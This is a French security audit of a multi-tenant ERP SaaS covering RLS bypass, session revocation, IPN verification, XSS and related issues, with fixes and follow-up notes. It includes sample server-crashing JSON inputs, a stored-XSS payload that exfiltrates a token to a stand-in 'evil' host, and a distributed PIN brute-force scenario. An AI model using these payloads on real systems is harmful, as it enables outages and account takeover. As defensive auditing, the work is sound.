# Audit de sécurité — ERP Ferme (SaaS multi-tenant)

**Date :** 2026-08-11
**Périmètre :** `server/src/**`, `web/js/**`, fichiers RLS/SQL, `deploy/`, CI/CD. Lecture seule, aucun fichier modifié.

---

## 1. Résumé exécutif

La posture de sécurité de cette application est **nettement au-dessus de la moyenne** pour un SaaS de cette taille : RLS PostgreSQL réellement enforced avec un script de vérification dédié (`verify-rls.js`), chiffrement authentifié AES-256-GCM des identifiants d'agrégateur, refus de démarrer sans secrets explicites, IPN PayDunya re-vérifiée côté serveur plutôt que crue sur parole, rate limiting sur les trois points d'entrée d'authentification, bcrypt partout, requêtes 100 % paramétrées (aucune injection SQL trouvée), et `npm audit --omit=dev` remonte **0 vulnérabilité en production**. Le travail de durcissement post-audit précédent est réel et bien documenté.

Les risques résiduels ne sont donc pas des « oublis de débutant » mais des **failles structurelles à fort impact** : (a) l'absence totale de gestion d'erreur asynchrone permet à n'importe qui, sans compte, d'arrêter le serveur avec une seule requête HTTP ; (b) le drapeau d'échappatoire `is_plateforme_admin` est posé sur des connexions mutualisées du pool avec une réinitialisation « best-effort », ce qui peut transformer silencieusement le filet RLS en passe-droit cross-tenant — et contrairement à ce qu'affirme la documentation du code, cette échappatoire **n'est pas en lecture seule** ; (c) aucune session staff n'est révocable avant 12 h, même après changement de mot de passe ou suppression du compte.

Trois de ces points touchent directement de l'argent réel et des données clients. Aucun n'exige une réécriture : ce sont des correctifs de quelques dizaines de lignes.

> **Note de suivi (2026-08-11, même session) :** C1, C2, E3 (partiel — filtre tenant_id) ont été
> corrigés le jour même. Voir [00-synthese.md](00-synthese.md).

---

## 2. Constats détaillés

### 🔴 CRITIQUE

---

#### C1 — Arrêt du serveur par un inconnu, en une requête HTTP

**Où :** `server/src/index.js` (aucun middleware d'erreur Express), `server/src/routes/portail.js:21-55` (aucun `try/catch`), et une trentaine d'autres handlers `async` sans `try/catch`.

**Ce que j'ai trouvé.** Express 4 n'attend pas les handlers `async` : si la promesse est rejetée et que rien ne l'attrape, Node 20 déclenche un `unhandledRejection` qui, par défaut depuis Node 15, **tue le processus**. Il n'y a ni middleware `(err, req, res, next)` dans `index.js`, ni `process.on('unhandledRejection')`.

`POST /api/portail/login` est le pire cas car il est public et n'a aucun `try/catch` :

```js
const result = await queryPreTenant(pool, `... WHERE c.telephone = $1 ...`, [telephone]);
...
const valide = await bcrypt.compare(pin, client.pin_hash);
```

Deux déclencheurs immédiats :
- `{"telephone": [], "pin": "1"}` → `node-postgres` sérialise le tableau en littéral Postgres, la comparaison `varchar = array` échoue, la promesse est rejetée → crash. **Aucun compte, aucun numéro valide requis.**
- `{"telephone": "<numéro client valide>", "pin": 123456}` (PIN en nombre JSON) → `bcryptjs` lève `Illegal arguments: number, string` → crash.

**Pourquoi c'est grave.** Un concurrent, un client mécontent, ou un script automatisé peut maintenir la plateforme hors ligne en boucle pour **toutes les fermes à la fois**. `restart: unless-stopped` relance le conteneur, mais chaque crash coupe toutes les requêtes en vol — y compris une transaction de paiement en cours de traitement IPN. Effet de bord aggravant : `express-rate-limit` utilise le **MemoryStore** par défaut, donc chaque redémarrage **remet à zéro tous les compteurs anti-brute-force** — un attaquant peut alterner « crash / rafale de tentatives de connexion » pour contourner entièrement la limitation.

**Recommandation.**
1. Filet de sécurité immédiat dans `index.js` :
   ```js
   process.on('unhandledRejection', (err) => console.error('Rejet non géré:', err));
   // + middleware final, APRÈS toutes les routes :
   app.use((err, req, res, next) => { console.error(err); res.status(500).json({ erreur: 'Erreur interne.' }); });
   ```
2. Envelopper les handlers `async` (`express-async-errors` en une ligne de `require`, ou un wrapper `asyncH(fn)` maison).
3. Valider les types en entrée avant de les passer à la base ou à bcrypt : `if (typeof telephone !== 'string' || typeof pin !== 'string')` → 400. À appliquer aussi à `/api/auth/login`.
4. Passer le store de `express-rate-limit` sur PostgreSQL ou Redis pour que les compteurs survivent aux redémarrages.

---

#### C2 — Le passe-droit `is_plateforme_admin` peut rester collé à une connexion du pool

**Où :** `server/src/auth.js:58-72` (`attachTenantConnection`), `server/src/creerFerme.js:56` et `:97`, `server/src/rls-policies.sql:32-34`.

**Ce que j'ai trouvé.** Le drapeau qui ouvre l'accès cross-tenant est posé via `set_config(..., false)` — **portée session**, pas transaction — sur une connexion empruntée au pool partagé, puis remis à zéro dans un `finally`/`res.on('finish')` dont l'erreur est **avalée** :

```js
// creerFerme.js:97
await client.query("SELECT set_config('app.current_tenant_id',''), set_config('app.is_plateforme_admin','')").catch(() => {});
client.release();
```

Or `attachTenantConnection` (auth.js:59-60), qui prépare la connexion de **toute requête authentifiée normale**, ne pose que `app.current_tenant_id` :

```js
req.db = await pool.connect();
await req.db.query('SELECT set_config($1, $2, false)', ['app.current_tenant_id', String(tenantId)]);
// app.is_plateforme_admin n'est JAMAIS remis à '' à l'acquisition
```

Si une connexion revient au pool avec le drapeau encore actif, la requête suivante — celle de n'importe quel utilisateur de n'importe quelle ferme — hérite du passe-droit. Ce n'est pas théorique : `queryPreTenant` (auth.js:86-95) existe précisément parce que **vous avez constaté en production le 2026-08-09 qu'une connexion du pool Supabase portait un `app.current_tenant_id` résiduel**. La même mécanique s'applique au drapeau plateforme, mais lui n'a pas reçu le même correctif défensif.

Chemin d'exposition le plus large : `POST /api/inscription` est **non authentifié** (simple code d'invitation) et appelle `creerNouvelleFerme(pool, ...)`, qui prend une connexion brute et y active `is_plateforme_admin = 'true'`.

**Ce que le drapeau ouvre réellement.** Le commentaire d'`auth.js:181-182` et celui de `rls-policies.sql:30-31` affirment : *« en LECTURE SEULE : aucune policy d'écriture n'a cette échappatoire »*. **C'est faux**, et votre propre `verify-rls.js` le prouve (tests 8, 8bis, 8ter, 8quater). En réalité `is_plateforme_admin()` autorise, sur **toutes** les organisations :

| Table | Ce que le drapeau autorise | Ligne |
|---|---|---|
| `organisations` | `UPDATE` — soft-delete de n'importe quelle ferme | rls-policies.sql:68-70 |
| `secteurs` | `SELECT` + `INSERT` | :161-164 |
| `audit_logs` | `INSERT` | :193-194 |
| `organisation_abonnement_saas` | `INSERT` / `UPDATE` / `DELETE` | :282-287 |
| `factures_saas` | tout (USING + WITH CHECK) | :290-292 |
| `utilisateurs`, `clients`, `tickets`, `ticket_messages` | `SELECT` cross-tenant | :86, :100, :213, :251 |

**Pourquoi c'est grave.** Le filet RLS — votre durcissement délibéré après le précédent audit — peut disparaître **sans aucun signal**. Les gardes applicatifs (`requireSuperviseurPlateforme`, filtres `WHERE tenant_id`) tiennent encore, donc ce n'est pas une fuite exploitable en un clic ; mais la défense en profondeur est neutralisée exactement là où vous comptiez dessus, et plusieurs routes s'appuient sur RLS comme **seul** rempart tenant (voir E3). Impact métier : lecture des clients, du chiffre d'affaires et des tickets d'une ferme concurrente ; désactivation d'une ferme cliente ; falsification de la facturation SaaS.

**Recommandation.**
1. Dans `attachTenantConnection`, poser les **deux** GUC à l'acquisition, pas seulement au relâchement — exactement comme `queryPreTenant` le fait déjà :
   ```js
   await req.db.query(
     "SELECT set_config('app.current_tenant_id', $1, false), set_config('app.is_plateforme_admin', '', false)",
     [String(tenantId)]
   );
   ```
   Correctif d'une ligne qui ferme le vecteur d'exposition à ~100 %.
2. Corriger les commentaires d'`auth.js:180-183` et `rls-policies.sql:27-34` : écrire la liste exacte des écritures autorisées. Un commentaire faux est un piège pour votre futur vous.
3. Envisager `SET LOCAL` dans une transaction explicite pour les routes plateforme : la portée transaction est auto-nettoyée par Postgres, ce qui rend la fuite structurellement impossible.
4. `POST /api/inscription` étant non authentifié, préférer une connexion dédiée hors pool pour `creerNouvelleFerme`, ou restreindre l'`INSERT` sur `organisations` par une policy dédiée plutôt que par le drapeau plateforme.

---

### 🟠 ÉLEVÉ

---

#### E1 — CORS ouvert à tous + PIN à 6 chiffres = brute-force distribué du portail client

**Où :** `server/src/index.js:19` (`app.use(cors())` sans options → `Access-Control-Allow-Origin: *`), `server/src/routes/portail.js:9-15`, `server/src/schema.sql:111` (`telephone VARCHAR(20) UNIQUE`).

**Ce que j'ai trouvé.** L'authentification étant par jeton Bearer en `localStorage` (pas de cookie), le CORS `*` ne crée pas de CSRF classique — c'est correct. En revanche, il permet à **n'importe quel site web** d'appeler `/api/portail/login` et `/api/auth/login` en cross-origin **et de lire la réponse**.

Scénario concret : un attaquant place un script sur un site à trafic (ou dans une publicité). Chaque visiteur exécute silencieusement quelques tentatives de connexion contre le portail, **depuis sa propre IP**. La limite de 8 tentatives / 15 min par IP devient inopérante : 10 000 visiteurs = 80 000 tentatives par quart d'heure sans jamais dépasser le seuil. Un PIN de 6 chiffres, c'est 1 000 000 de combinaisons — quelques heures suffisent. Le numéro de téléphone étant `UNIQUE` globalement, l'attaquant n'a besoin que d'un numéro de client, et n'a pas besoin de savoir de quelle ferme il relève.

**Impact métier.** Accès à l'historique de commandes, aux factures et aux **PDF de facture** d'un client, plus la possibilité d'ouvrir des tickets en son nom.

**Recommandation.**
1. Restreindre l'origine : `cors({ origin: [/\.massla\.sn$/, 'https://massla.sn'] })`. Le frontend étant servi par le même serveur Express, une politique `same-origin` stricte suffirait même.
2. Passer le PIN à 8 chiffres, ou ajouter un verrouillage progressif **par compte client** (pas seulement par IP) : `clients.tentatives_echouees` + blocage temporaire après 5 échecs.
3. Ajouter un `limit_req_zone` nginx sur `/api/portail/login` et `/api/auth/login` en complément de la limite applicative.

> **Note de suivi (2026-08-11, même session) :** points 1 et 2 corrigés — CORS restreint à
> `massla.sn`/sous-domaines (`server/src/cors-origine.js`, testé isolément dans `tests/cors.test.js`),
> et verrouillage par compte après 5 échecs pendant 15 min (`clients.pin_tentatives_echouees`,
> `clients.pin_bloque_jusqu`, migration-10, testé dans `tests/portail-verrouillage.test.js`). Point 3
> (`limit_req_zone` nginx) reste à faire.

---

#### E2 — Aucune révocation de session staff : 12 h d'accès garanti après compromission

**Où :** `server/src/auth.js:16-35` et `:143-175`, `server/src/routes/utilisateurs.js:101-133`.

**Ce que j'ai trouvé.** Le JWT staff embarque `role`, `secteur_id`, `tenant_id` et `superviseurPlateforme`, expire en 12 h, et **rien ne peut l'invalider avant**. Le portail client, lui, fait exactement la bonne chose (`pin_version` revérifié à chaque requête, auth.js:117-123) — la même protection n'existe simplement pas côté staff.

Concrètement, après avoir :
- changé le mot de passe d'un employé (`PUT /utilisateurs/:id/mot-de-passe`),
- désactivé son compte (`actif = false`),
- ou l'avoir supprimé (`DELETE /utilisateurs/:id`),

son jeton reste **pleinement valide jusqu'à 12 h**. `requireAuth` ne vérifie que `organisations.deleted_at` et le statut d'abonnement, jamais l'état de l'utilisateur lui-même. Idem pour la rétrogradation d'un rôle (un `admin` passé `livreur` reste `admin` dans son jeton) et pour le retrait du flag `est_superviseur_plateforme` — le compte superviseur garde l'accès cross-tenant à toutes les fermes pendant 12 h après révocation.

**Impact métier.** Un comptable licencié ou un poste volé garde un accès complet aux finances et aux clients pendant une demi-journée. Pour un ERP qui manipule des encaissements, c'est le trou le plus coûteux du rapport en cas d'incident RH.

**Recommandation.**
1. Ajouter `utilisateurs.token_version INT NOT NULL DEFAULT 1`, l'inclure dans le jeton, et l'incrémenter à chaque changement de mot de passe / désactivation / suppression / changement de rôle.
2. Dans `requireAuth`, étendre la requête d'état déjà présente (auth.js:156-161) pour joindre `utilisateurs` et vérifier `actif`, `deleted_at`, `token_version` et `est_superviseur_plateforme` en base. Le coût est nul : la requête existe déjà, il s'agit d'un `JOIN` supplémentaire.
3. Réduire l'expiration staff à 2-4 h avec un mécanisme de rafraîchissement, ou au minimum pour les jetons portant `superviseurPlateforme: true`.

> **Note de suivi (2026-08-11, même session) :** points 1 et 2 corrigés. `token_version` ajouté
> (migration-11), embarqué dans chaque JWT (`?? 1` de repli pour les jetons déjà émis, dont le
> claim est absent), vérifié dans requireAuth en une seule requête combinée avec le contrôle
> d'abonnement existant, **y compris pendant une impersonation** (l'identité de l'utilisateur ciblé
> reste vérifiée, seul le statut de l'organisation est contourné). Incrémenté sur changement de mot
> de passe, modification (rôle/secteur/actif/nom/email — coarse mais sûr) et suppression. Résout
> aussi F5 (secteur_id figé dans le jeton) au passage, comme anticipé. Point 3 (réduire l'expiration
> à 2-4h) reste à faire. **Effet de bord attendu au déploiement** : toute session déjà ouverte avant
> ce correctif porte un jeton sans le claim `tokenVersion` (`undefined ≠ 1`) — déconnexion forcée de
> tout le staff actif au moment du déploiement, y compris soi-même. Comportement voulu, pas un bug.

---

#### E3 — `POST /api/clients/:id/pin` : cassé sous RLS réelle, et sans filtre tenant

**Où :** `server/src/routes/clients.js:66-78`.

**Ce que j'ai trouvé.** Deux défauts qui se combinent :

```js
router.post('/:id/pin', requireAuth(pool), checkRole(['admin','comptable']), async (req, res) => {
    const pin = String(Math.floor(100000 + Math.random() * 900000));   // (1)
    const pinHash = await bcrypt.hash(pin, 10);
    const result = await req.db.query(
        `UPDATE clients SET pin_hash = $1, pin_version = pin_version + 1
         WHERE id = $2 AND deleted_at IS NULL RETURNING id, nom, telephone`,   // (2) pas de tenant_id
        [pinHash, req.params.id]
    );
    ...
    await logAudit(req.db, { table: 'clients', ..., userId: req.user.id });    // (3) tenantId absent
    res.json({ client: result.rows[0], pin });
});
```

**(2)** C'est la seule route d'écriture de tout le codebase où le filtre `tenant_id` est absent. La policy `tenant_isolation_update ON clients` la couvre, mais RLS est ici l'**unique** rempart — plus de défense en profondeur. Si le drapeau de C2 fuite, ou si `DATABASE_URL` repointe un jour vers le rôle propriétaire (qui contourne RLS, cf. `enable-rls.sql:13-16`), un admin de la ferme A peut régénérer le PIN d'un client de la ferme B, **récupérer ce PIN en clair dans la réponse** avec son nom et son téléphone, et se connecter à son portail. C'est une prise de contrôle de compte cross-tenant en un appel.

**(3)** `logAudit` est appelé sans `tenantId` → `audit_logs.tenant_id = NULL` → la policy `WITH CHECK (tenant_id = current_tenant_id() OR is_plateforme_admin())` s'évalue à `NULL OR false` = non satisfaite → l'`INSERT` est **rejeté**. Comme la route n'a pas de `try/catch`, on obtient : le PIN est déjà rotaté et committé, puis la promesse est rejetée → aucune réponse n'est renvoyée → et le processus tombe (C1).

**Résultat opérationnel aujourd'hui, en production :** cliquer « Générer PIN » invalide immédiatement la session portail du client (`pin_version + 1`), **n'affiche jamais le nouveau PIN** à l'admin, et fait redémarrer le serveur. Le client est définitivement verrouillé hors de son portail. C'est exactement la même classe de bug que celui corrigé le 2026-08-10 sur `parametres-paiement.js` — invisible sous pg-mem, qui n'applique jamais RLS.

**Recommandation.** Ajouter `AND tenant_id = $3` à l'`UPDATE`, ajouter `tenantId: req.user.tenant_id` au `logAudit`, envelopper dans un `try/catch`. Ajouter un cas dans `verify-rls.js` couvrant l'écriture d'`audit_logs` avec `tenant_id` NULL — c'est le piège générique.

---

#### E4 — Impersonation : jeton de 12 h, non révocable, qui contourne les blocages

**Où :** `server/src/routes/plateforme.js:205-248`, `server/src/auth.js:16-35` et `:155`.

**Ce que j'ai trouvé.** `POST /organisations/:id/se-connecter-admin` émet un jeton admin complet pour la ferme cible, valable 12 h, avec `impersonation: true` — ce qui lui fait **sauter les contrôles de suspension d'abonnement et de suppression d'organisation** (auth.js:155-169). Le choix est justifié (dépanner une ferme bloquée), mais :

- La durée est la même que pour une session normale. Une session de support devrait durer 30-60 min.
- Le jeton n'est pas révocable et n'est lié à aucun identifiant de session ; une fois émis, rien ne permet de l'arrêter ni de savoir s'il est encore actif.
- Il est stocké en `localStorage` (`web/js/api.js:34-37`) côté navigateur du superviseur, à côté du jeton superviseur mis de côté (`erp_superviseur_token`). Un XSS dans le frontend (voir M2) exfiltre les **deux** — c'est-à-dire les clés de toutes les fermes.
- Le journal d'audit enregistre l'ouverture (`CONNEXION_SUPPORT`) mais **rien de ce qui est fait ensuite n'est marqué comme provenant du support** : les actions sont attribuées à l'admin de la ferme cible, indiscernables de ses propres actions. Si un client conteste une modification, vous ne pouvez pas prouver qui a agi.

**Recommandation.** Réduire l'expiration à 30-60 min pour `viaImpersonation`. Propager le marqueur `impersonation` (et l'identité du superviseur) dans chaque écriture d'`audit_logs` de la session. Journaliser une entrée de fin de session côté frontend au retour à la session superviseur.

> **Note de suivi (2026-08-12) :** premier point corrigé — `signToken` émet désormais un jeton de
> 45 min pour `viaImpersonation` (au lieu de 12h, identique à une session staff normale). Testé
> (226/226, +1 test dédié comparant les deux durées). Restent ouverts, non traités ici : la
> propagation du marqueur `impersonation`/identité superviseur dans `audit_logs`, et une entrée de
> fin de session côté frontend — des changements plus larges (schéma + plusieurs points d'écriture)
> que la réduction de durée elle-même, volontairement scindés.

---

#### E5 — IPN PayDunya : la vérification croisée documentée n'est pas implémentée

**Où :** `server/src/routes/finance.js:184-282`, `server/src/paydunya.js:33-36`.

**Ce que j'ai trouvé.** L'architecture est bonne : le contenu de l'IPN n'est jamais cru, on re-confirme auprès de PayDunya avec les clés de l'organisation propriétaire. C'est la bonne façon de faire en l'absence de signature HMAC chez PayDunya. Mais trois écarts subsistent :

1. **`referenceInterne` n'est jamais vérifiée.** `paydunya.js:33-36` annonce qu'elle « sert de vérification croisée en plus du token lui-même » ; `confirmerFacture` la retourne bien (`paydunya.js:90`) — et `finance.js` ne la lit jamais. Le contrôle documenté n'existe pas.
2. **Le montant confirmé n'est pas comparé au montant attendu.** `confirmation.montant` est appliqué tel quel à `montant_restant` (finance.js:255-261) et au `solde_encours` B2B, sans le confronter à `paiements.montant` enregistré à l'initiation. Si un compte marchand PayDunya d'une ferme est compromis (ou si la ferme elle-même manipule ses propres factures depuis son back-office PayDunya), un montant gonflé solde des créances qui n'ont pas été payées.
3. **Endpoint public sans rate limiting.** Chaque appel déclenche une requête HTTPS sortante vers PayDunya. Un attaquant peut inonder `/api/finance/paiements/ipn` pour saturer votre quota API PayDunya et faire échouer les paiements légitimes. Il obtient aussi un oracle d'existence de jeton (réponse différente selon que le paiement existe).

**Recommandation.** Comparer `confirmation.referenceInterne` au préfixe `commande_id` attendu et `confirmation.montant` à `paiements.montant` — refuser (et alerter) en cas d'écart. Ajouter un `rateLimit` généreux (ex. 100/min) sur la route. Journaliser tout rejet dans `audit_logs`.

> **Note de suivi (2026-08-12) :** corrigé. Nouvelle colonne `paiements.reference_interne`
> (migration-13, nullable), générée à l'initiation et comparée à `confirmation.referenceInterne`
> reçue via l'IPN ; `confirmation.montant` comparé à `paiements.montant` enregistré à l'initiation.
> Tout écart marque le paiement `ECHOUE` (sans créditer) et journalise le détail dans
> `audit_logs` (action `ANOMALIE_IPN`), plutôt que de refuser silencieusement — un paiement
> incohérent doit rester visible pour investigation manuelle. `rateLimit` 100/min ajouté sur
> `/paiements/ipn`. Testé (218/218, +3 tests dédiés : montant incohérent, référence incohérente,
> cas nominal cohérent).

---

### 🟡 MOYEN

---

#### M1 — Gestion de la clé de chiffrement : pas de KDF, pas de rotation, colocalisée avec la base

**Où :** `server/src/credentials.js:9-20`.

```js
const KEY = crypto.createHash('sha256').update(process.env.CREDENTIALS_ENCRYPTION_KEY || '...').digest();
```

Le choix d'AES-256-GCM est correct, l'IV aléatoire par message aussi, le format auto-suffisant `iv|tag|données` est propre. Trois réserves :

- **Pas de KDF.** Un simple SHA-256, sans sel ni itérations. Si `CREDENTIALS_ENCRYPTION_KEY` est une phrase mémorisable plutôt qu'un `openssl rand -base64 32`, elle est attaquable par dictionnaire à très grande vitesse une fois un dump de base obtenu. Utiliser `scrypt` ou `hkdf` avec un sel fixe applicatif.
- **Pas de versionnage de clé.** Le format chiffré ne porte aucun identifiant de clé : **il n'existe aucun moyen de faire tourner la clé** sans re-chiffrer tout d'un coup, et sans possibilité de rollback. Préfixer d'un octet de version résout le problème pour l'avenir.
- **Périmètre de protection à clarifier.** `CREDENTIALS_ENCRYPTION_KEY` et `DATABASE_URL` vivent dans le même `server/.env`, sur le même VPS. Le chiffrement protège donc contre une **fuite de la base seule** (dump, sauvegarde, accès Supabase) — pas contre une compromission du serveur applicatif. C'est un choix raisonnable à votre échelle, mais il faut le savoir : ce n'est pas « les clés PayDunya sont en sécurité », c'est « les clés PayDunya survivent à une fuite de base ».

---

#### M2 — XSS stocké : nom de secteur non échappé

**Où :** `web/js/views/catalogue.js:16` et `web/js/views/comptabilite.js:134`.

```js
${secteurs.map((s) => `<option value="${s.id}">${s.nom}</option>`).join('')}
```

L'échappement est appliqué de manière remarquablement systématique dans tout le frontend (helper `esc()` défini dans `app.js:113-119`, utilisé partout ailleurs, y compris dans le Journal d'audit). Ces deux occurrences sont les seules oubliées.

Le nom de secteur est **entièrement libre** : `creerFerme.js:64-70` fait un `.trim()` et rien d'autre, et `POST /plateforme/organisations/:id/secteurs` (plateforme.js:270) idem. Une ferme peut donc s'inscrire avec un secteur nommé `<img src=x onerror="fetch('https://evil/'+localStorage.erp_token)">`, qui s'exécutera dans le navigateur de tout utilisateur de cette organisation ouvrant Catalogue ou Comptabilité — et exfiltrera son jeton depuis `localStorage`. C'est du XSS intra-tenant (l'admin qui se piège lui-même a peu d'intérêt), mais il devient une escalade réelle si le superviseur ouvre ces écrans pendant une impersonation : son `erp_superviseur_token` est dans le même `localStorage` (E4).

**Recommandation.** Envelopper les deux occurrences dans `esc()`, et restreindre le format des noms de secteur côté serveur (lettres, chiffres, espaces, tirets).

> **Note de suivi (2026-08-12) :** corrigé. Les deux occurrences (`catalogue.js`, `comptabilite.js`)
> enveloppées dans `esc()`. Nouveau `validation.js` (`nomSecteurValide`, regex Unicode
> lettres/chiffres/espaces/tirets/apostrophe, 50 caractères max) appliqué aux deux points de
> création (`creerFerme.js` — inscription self-service — et `routes/plateforme.js` — création
> directe par le superviseur), en défense en profondeur : même si un futur point d'entrée oubliait
> `esc()`, la valeur stockée ne pourrait plus contenir de caractères dangereux. Testé (225/225,
> +2 tests dédiés : rejet d'un nom de secteur contenant du HTML/script sur les deux points d'entrée).

---

#### M3 — Contraintes `UNIQUE` globales : oracle d'énumération + collisions cross-tenant

**Où :** `server/src/schema.sql:55` (`utilisateurs.email`), `:111` (`clients.telephone`), `:152` (`code_lot`), `:216` (`numero_commande`), `:349`.

Ces contraintes sont globales, pas par tenant. Conséquences :

- **Énumération.** Un admin de n'importe quelle ferme peut tester si une adresse email ou un numéro de téléphone est déjà utilisé **quelque part sur la plateforme** : le message d'erreur diffère (`clients.js:35`, `utilisateurs.js:62`). Pour un attaquant qui a acheté un abonnement à 1 ferme, c'est un moyen de cartographier la clientèle de vos autres clients.
- **Déni de service par collision.** La ferme A qui crée le lot `A-45` empêche définitivement la ferme B de créer un lot du même code.
- **Bug de collision réel sur `numero_commande`.** `commandes.js:107` génère `CMD-${Date.now().toString().slice(-6)}` : les 6 derniers chiffres d'un timestamp en millisecondes **se répètent toutes les ~16,7 minutes**. Deux commandes créées à 16,7 min d'intervalle dans **n'importe quelles** organisations peuvent entrer en collision → violation d'unicité → 500 (et crash, cf. C1) en pleine prise de commande. Ce n'est pas un risque théorique : avec plusieurs fermes actives, c'est une question de temps.

**Recommandation.** Passer ces contraintes en `UNIQUE (tenant_id, colonne)`. Remplacer le générateur de `numero_commande` par une séquence par tenant ou un suffixe aléatoire suffisamment large.

> **Note de suivi (2026-08-12) :** corrigé pour `code_lot`, `numero_commande` (2 tables) —
> `UNIQUE (tenant_id, colonne)` (migration-14). Nouveau générateur `numero.js` (horodatage base36 +
> suffixe aléatoire + boucle de vérification d'unicité par ferme, même modèle que
> `genererSlugUnique`) : élimine la collision au lieu de la rendre seulement improbable.
> `utilisateurs.email` et `clients.telephone` restent volontairement globaux : la résolution du
> tenant à la connexion (staff par email, portail par téléphone) en dépend — voir le commentaire
> déjà présent dans `schema.sql` et la décision prise pour le task #50. Les changer casserait le
> flux de connexion actuel ; ce serait un projet séparé (résoudre le tenant autrement à la
> connexion), pas une correction ponctuelle. Testé (223/223, +3 tests dédiés : collision cross-
> tenant sur `numero_commande` et `code_lot`, génération de numéros distincts).

---

#### M4 — Validation des entrées absente sur les quantités et les montants

**Où :** `server/src/routes/commandes.js:49-144`, `server/src/routes/logistique.js:131-163`.

`ligne.quantite` n'est jamais validé comme un entier positif. Le contrôle de stock `Number(produit.quantite_disponible) < Number(ligne.quantite)` passe toujours pour une valeur négative. Une commande avec `quantite: -50` :
- **augmente** le stock disponible (`quantite_disponible + (-(-50))`),
- produit un `sousTotal` négatif, donc un `montantTotal` négatif,
- et pour un client B2B, **réduit son `solde_encours`** (`commandes.js:129`), c'est-à-dire efface sa dette.

Un comptable peut ainsi effacer l'encours d'un client complice sans laisser d'autre trace qu'une commande à montant négatif. Une valeur non numérique produit `NaN` et corrompt les totaux.

Même famille : `methode_paiement` n'est jamais validé contre une liste blanche dans `logistique.js`, et `montant_encaisse` n'est comparé à aucun plafond.

**Recommandation.** Valider systématiquement en tête de handler : `Number.isFinite(q) && q > 0 && Number.isInteger(q)`. Ajouter une contrainte `CHECK (quantite > 0)` sur `lignes_commande` et `CHECK (montant >= 0)` sur `paiements` — la base est le dernier rempart fiable.

---

#### M5 — Sauvegardes non chiffrées, et topic d'alertes en clair dans le dépôt

**Où :** `deploy/backup.sh:29-38`, `deploy/monitor.sh:8`.

`pg_dump --format=custom` ne chiffre rien : les dumps synchronisés vers Cloudflare R2 contiennent en clair l'ensemble des données clients (noms, téléphones, coordonnées GPS des adresses de livraison), les hachages bcrypt et toute la comptabilité de chaque ferme. Seules les clés PayDunya/WhatsApp sont protégées (via M1). Une clé rclone compromise sur le VPS = fuite totale de toutes les fermes.

Par ailleurs, `NTFY_TOPIC="erp-massla-alertes-97963866109cd7138fe636fb"` est **committé dans le dépôt**. Les topics ntfy.sh sont publics par défaut : quiconque lit le dépôt peut s'abonner à vos alertes d'exploitation (il apprend quand vous êtes hors ligne ou quand une sauvegarde échoue — les meilleurs moments pour attaquer) et **publier de fausses alertes** pour provoquer une fatigue d'alerte.

**Recommandation.** Chiffrer le dump avant l'envoi (`gpg --symmetric` ou `age`, clé stockée hors du VPS) ; à défaut, activer le chiffrement côté serveur R2 et vérifier que le bucket est privé avec une clé rclone en écriture seule. Déplacer `NTFY_TOPIC` dans `server/.env` et régénérer le topic.

> **Note de suivi (2026-08-11) :** le chiffrement des secrets (server/.env, ovh.ini) et la
> paramétrisation de `NTFY_TOPIC` via l'environnement ont été implémentés le jour même dans
> `deploy/backup.sh`. Le chiffrement des dumps de base eux-mêmes (données clients) reste à faire.

---

#### M6 — Configuration TLS nginx implicite, et absence de rate limiting au niveau du proxy

**Où :** `deploy/nginx.conf:23-37`.

Le bloc `443` ne définit ni `ssl_protocols`, ni `ssl_ciphers`, ni `ssl_prefer_server_ciphers`, ni `ssl_session_cache`, ni `ssl_stapling`, ni HTTP/2. Vous héritez donc entièrement des valeurs par défaut de l'image `nginx:alpine` — actuellement raisonnables (TLS 1.2/1.3), mais **non maîtrisées** : elles changent au gré des mises à jour d'image, sans que rien dans votre dépôt ne le reflète. La redirection HTTP→HTTPS et le HSTS (posé par Helmet, `max-age=1 an; includeSubDomains`) sont en revanche corrects.

**Recommandation.** Fixer explicitement `ssl_protocols TLSv1.2 TLSv1.3;` et une suite de chiffrements moderne (le générateur Mozilla SSL Config « intermediate » fournit le bloc prêt à coller), activer `listen 443 ssl http2;` et `ssl_stapling on;`. Ajouter un `limit_req_zone` sur les routes d'authentification et l'IPN.

---

#### M7 — Journal d'audit incomplet

**Où :** `server/src/audit.js`, `server/src/rls-policies.sql:186-199`, `server/src/routes/audit.js`.

Le journal couvre bien les écritures métier, et le choix de journaliser la connexion support **dans le tenant cible** est excellent. Manquent toutefois :

- **Les échecs d'authentification.** Seuls les `LOGIN` réussis sont tracés (`routes/auth.js:67`). Aucune détection possible d'une campagne de brute-force — c'est précisément la donnée qui aurait révélé l'attaque décrite en E1.
- **Les lectures sensibles.** Aucune trace des consultations/exports de données clients ou financières, ni des accès de la vue plateforme aux données d'une ferme (seul `se-connecter-admin` est tracé, pas la consultation des tickets ou de l'abonnement).
- **L'immuabilité.** Les policies autorisent `UPDATE` et `DELETE` sur `audit_logs` pour le tenant lui-même (`:195-199`). Un admin de ferme compromis peut effacer ses traces — ce qui annule la valeur probante du journal. Aucune route n'expose cette capacité aujourd'hui, mais la base l'autorise.
- **Le contexte.** Ni adresse IP, ni user-agent, ni marqueur d'impersonation.

**Recommandation.** Retirer les policies `UPDATE`/`DELETE` sur `audit_logs` (journal en append-only). Journaliser les échecs de connexion (avec l'IP). Ajouter les colonnes `ip`, `user_agent`, `via_impersonation`.

---

#### M8 — Code d'invitation unique, statique et partagé

**Où :** `server/src/routes/inscription.js:14` et `:39`.

`SIGNUP_INVITE_CODE` est une valeur unique, partagée avec tous les prospects, qui ne tourne jamais et n'est jamais consommée. Le premier client qui le transmet à un tiers ouvre la création d'organisations à quiconque (dans la limite de 5/h/IP — contournable avec quelques IP). Chaque organisation créée consomme de la base, apparaît dans votre vue plateforme et brouille votre facturation. La comparaison `code !== SIGNUP_INVITE_CODE` n'est pas à temps constant (impact faible ici grâce au rate limiting).

**Recommandation.** Passer à des codes à usage unique en base (`invitations` : code, créé_par, expire_le, consommé_le), générés depuis la vue plateforme au moment de la vente. Comparer avec `crypto.timingSafeEqual`.

---

### 🔵 FAIBLE

- **F1 — CSP : `'unsafe-inline'` sur `styleSrc` et dépendance externe sans SRI** (`index.js:26-40`). Leaflet est chargé depuis `unpkg.com` sans `integrity` : une compromission d'unpkg donne l'exécution de JS arbitraire dans vos sessions. Auto-héberger Leaflet supprime à la fois cette dépendance et le besoin de `https://unpkg.com` dans la CSP. `'unsafe-inline'` sur les styles est un affaiblissement modéré (il facilite l'exploitation d'un XSS comme M2).
